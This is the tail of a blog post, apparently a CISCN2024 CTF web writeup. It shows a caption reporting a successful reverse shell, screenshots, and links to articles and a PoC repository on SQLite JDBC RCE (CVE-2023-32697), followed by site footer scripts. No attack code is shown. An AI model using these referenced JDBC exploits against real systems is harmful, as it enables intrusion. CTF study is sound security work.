+<p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405250436448.png" alt="image-20240525043608391"></p>
+<p>成功反弹shell<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/202405250430805.png" alt="Pasted image 20240525042329.png" title="wikilink"></p>
+<p>参考文章：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.ctfiot.com/117914.html">CVE-2023-32697——sqlite jdbc RCE</a></li>
+<li><a target="_blank" rel="noopener" href="https://m0d9.me/2021/04/26/Jdbc%E7%A2%8E%E7%A2%8E%E5%BF%B5%E4%B8%89%EF%BC%9A%E5%86%85%E5%AD%98%E6%95%B0%E6%8D%AE%E5%BA%93/">Jdbc碎碎念三：内存数据库 | m0d9’s blog</a></li>
+<li><a target="_blank" rel="noopener" href="https://su18.org/post/jdbc-connection-url-attack/#sqlite">JDBC Connection URL Attack | 素十八 — JDBC Connection URL Attack | 素十八 (su18.org)</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/su18/JDBC-Attack/blob/main/sqlite-attack/src/main/java/org/su18/jdbc/attack/AttackSQLite.java">su18 jdbc attack github</a></li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/13931">https://xz.aliyun.com/t/13931</a></li>
+</ul>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/sketchpl4ne">Projects</a></li>
+        
+          <li><a href="/links/">links</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#simple-php"><span class="toc-number">2.</span> <span class="toc-text">simple_php</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easycms"><span class="toc-number">3.</span> <span class="toc-text">easycms</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easycms-revenge"><span class="toc-number">4.</span> <span class="toc-text">easycms_revenge</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezjava"><span class="toc-number">5.</span> <span class="toc-text">ezjava</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://jaspersec.top/posts/3286688009.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://jaspersec.top/posts/3286688009.html&text=CISCN2024 writeup（web部分）"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://jaspersec.top/posts/3286688009.html&title=CISCN2024 writeup（web部分）"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://jaspersec.top/posts/3286688009.html&is_video=false&description=CISCN2024 writeup（web部分）"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CISCN2024 writeup（web部分）&body=Check out this article: https://jaspersec.top/posts/3286688009.html"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://jaspersec.top/posts/3286688009.html&title=CISCN2024 writeup（web部分）"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://jaspersec.top/posts/3286688009.html&title=CISCN2024 writeup（web部分）"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://jaspersec.top/posts/3286688009.html&title=CISCN2024 writeup（web部分）"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://jaspersec.top/posts/3286688009.html&title=CISCN2024 writeup（web部分）"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://jaspersec.top/posts/3286688009.html&name=CISCN2024 writeup（web部分）&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://jaspersec.top/posts/3286688009.html&t=CISCN2024 writeup（web部分）"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023-2025
+    Jasper_sec
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/sketchpl4ne">Projects</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+      <ul>
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        <span id="busuanzi_container_site_pv">
+          本站总访问量 <span id="busuanzi_value_site_pv"></span>次
+        </span>
+        <span id="busuanzi_container_site_uv">
+          本站访客数 <span id="busuanzi_value_site_uv"></span>人
+        </span>
+        <span id="busuanzi_container_page_uv">
+          本页访问量 <span id="busuanzi_value_page_pv"><!-- number will be auto injected here by busuanzi --></span>次
+        </span>
+      </ul>
+    </nav>
+  </div>
+
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+  <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?21e6754c7f372c2de41518ffb4f72c33";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+        </script>
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
